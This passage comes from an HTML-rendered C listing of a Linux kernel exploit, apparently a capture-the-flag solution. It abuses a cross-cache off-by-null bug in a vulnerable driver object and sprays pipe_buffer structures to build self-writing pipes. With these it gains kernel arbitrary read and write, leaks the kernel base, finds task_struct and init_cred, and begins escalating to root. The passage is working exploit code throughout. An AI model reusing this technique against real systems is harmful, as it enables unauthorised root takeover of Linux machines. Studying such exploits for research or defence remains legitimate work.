pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[<span class="number">0</span> + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, <span class="number">0</span> + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">        free_page(pgv_8pages_start_idx++);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            create(i, <span class="number">8</span>, <span class="string">&quot;0x196082&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[(PIPE_SPRAY_NUM / <span class="number">2</span>) + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, (PIPE_SPRAY_NUM / <span class="number">2</span>) + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0x61</span>, <span class="number">0x800</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            edit(i, <span class="number">0x7f8</span>, buf);</span><br><span class="line">        &#125;</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> str_flag[<span class="number">0x10</span>];</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memset</span>(str_flag, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(str_flag));</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], str_flag, <span class="number">8</span>);</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(str_flag, <span class="string">&quot;0x196082&quot;</span>) &amp;&amp; nr != i)</span><br><span class="line">            &#123;</span><br><span class="line">                orig_pid = nr;</span><br><span class="line">                victim_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>,</span><br><span class="line">                       victim_pid, orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (victim_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> snd_orig_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> snd_vicitm_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">               info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> || (<span class="keyword">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">        info_pipe_buf.page = (struct page *)((<span class="keyword">size_t</span>)info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">            <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)</span><br><span class="line">            &#123;</span><br><span class="line">                snd_orig_pid = nr;</span><br><span class="line">                snd_vicitm_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">        evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">        evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_2nd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       self_2nd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_3rd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_3rd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i == self_3rd_pipe_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_4th_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                       self_4th_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">        evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">        evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">        evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">        evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">        write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">        evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        vmemmap_base = (<span class="keyword">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)buf &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((*(<span class="keyword">uint64_t</span> *)buf &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x070</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       kernel_base, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> parent_task, current_task;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> *comm_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint64_t</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * <span class="number">0x40</span>), point_buf);</span><br><span class="line"></span><br><span class="line">            comm_addr = memmem(point_buf, <span class="number">0xf00</span>, target, <span class="number">0xf</span>);</span><br><span class="line">            <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">                current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">                page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">                page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       (struct page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                       page_offset_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                       <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                       current_task);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> command = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> stack_addr;</span><br><span class="line">    <span class="keyword">size_t</span> *tsk_buf;</span><br><span class="line">    <span class="keyword">size_t</span> *mm_struct_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> mm_struct_page;</span><br><span class="line">    <span class="keyword">uint64_t</span> pgd_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (command)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_task;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_cred;</span><br><span class="line">            <span class="keyword">uint64_t</span> init_nsproxy;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (;;)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">                tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((struct page *)ptask_page_addr, buf);</span><br><span class="line">                arbitrary_read_by_pipe((struct page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">                <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            init_task = parent_task;</span><br><span class="line">            init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">            init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span 